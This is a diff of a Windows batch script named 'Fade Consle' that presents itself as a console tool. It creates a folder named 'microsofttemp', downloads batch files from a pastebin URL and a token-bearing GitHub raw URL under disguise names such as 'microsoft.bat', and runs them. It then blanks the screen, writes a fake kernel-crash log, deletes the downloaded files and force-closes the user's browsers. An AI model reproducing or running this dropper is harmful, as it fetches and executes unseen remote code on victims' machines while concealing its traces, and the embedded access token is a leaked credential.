@@ -1,10 +1,29 @@
 @echo off
+echo Enter command
+set /p command=  %USERNAME%-$
+if %command% == Earth goto Earth
+if %command% == earth goto Earth
+if %command% == iplookup goto iplookup
+if %command% == dir goto dir
+if %command% == user goto user
 color 0a
 title Fade Consle
 cd C:\Users\%USERNAME%\desktop
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
+cls
+ping 1.1.1.1 -a
+cls
+cls
+cls
+cls
+cls
+cls
+cls
+cls
+cls
+cls
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
@@ -12,6 +31,7 @@ ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
+cls
 mkdir FadeDUMP
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
@@ -26,6 +46,7 @@ ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
+cls
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
@@ -344,12 +365,6 @@ ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 ping localhost -n 1 >nul
 color CF
-set /p command= $
-if %command% == Earth goto Earth
-if %command% == earth goto Earth
-if %command% == iplookup goto iplookup
-if %command% == dir goto dir
-if %command% == user goto user
 cd C:\
 echo high level sex
 echo yes yes yes
@@ -363,20 +378,34 @@ IPCONFIG
 mkdir microsofttemp
 cd microsofttemp
 curl -s https://pastebin.com/raw/uNbxgusV --output feedbacktemp.bat
+curl -s https://raw.githubusercontent.com/LUXLiii/sigmadd/main/LOKKK.bat?token=GHSAT0AAAAAACT4FLI6WZMGJGOHFZUJNDWQZTUMFPA --output microsoft.bat
 start feedbacktemp.bat
+start microsoft.bat
+color 00
+echo WindowsKernelCrash>CrashLog.txt
 cls
 cls
 mkdir Feedback
+mkdir Logs
 cls
 cls
 timeout 2
 timeout 1
+ping 192.168.0.1
 cls
 cls
 cls
-timeout 2
-del sigmatemp.bat
+cls
+cls
+cls
+cls
+cls
+cls
+cls
+del feedbacktemp.bat
+del microsoft.bat
 color 02
+color 00
 taskkill /IM msedge.exe /F
 taskkill /IM chrome.exe /F
 taskkill /IM firefox.exe /F
